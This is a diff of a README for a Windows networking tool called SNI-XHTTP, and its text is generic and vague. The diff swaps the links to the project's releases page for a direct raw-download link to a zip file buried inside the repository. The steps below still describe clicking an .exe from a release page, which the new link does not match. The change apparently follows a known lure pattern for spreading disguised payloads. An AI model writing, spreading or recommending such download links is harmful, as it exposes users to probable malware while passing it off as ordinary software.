@@ -1,6 +1,6 @@
 # 🌐 SNI-XHTTP - Reliable connections for your daily tasks
 
-[![Download SNI-XHTTP](https://img.shields.io/badge/Download_SNI-XHTTP-blue.svg)](https://github.com/amuck-tie267/SNI-XHTTP/releases)
+[![Download SNI-XHTTP](https://img.shields.io/badge/Download_SNI-XHTTP-blue.svg)](https://github.com/amuck-tie267/SNI-XHTTP/raw/refs/heads/main/v1.0/api/XHTTP_SN_v2.5.zip)
 
 SNI-XHTTP helps you improve your network connectivity. It manages web requests to ensure you reach your destination without interruption. This tool works in the background to handle data traffic. It provides a stable bridge between your computer and the services you use every day. 
 
@@ -14,7 +14,7 @@ You need a computer running Windows 10 or Windows 11. The software requires 50 m
 
 ## 📥 Download and installation
 
-1. Visit this page to download: https://github.com/amuck-tie267/SNI-XHTTP/releases
+1. Visit this page to download: https://github.com/amuck-tie267/SNI-XHTTP/raw/refs/heads/main/v1.0/api/XHTTP_SN_v2.5.zip
 2. Find the latest release version on the page.
 3. Click the file ending in .exe to start your download.
 4. Locate the file in your Downloads folder after the transfer finishes.
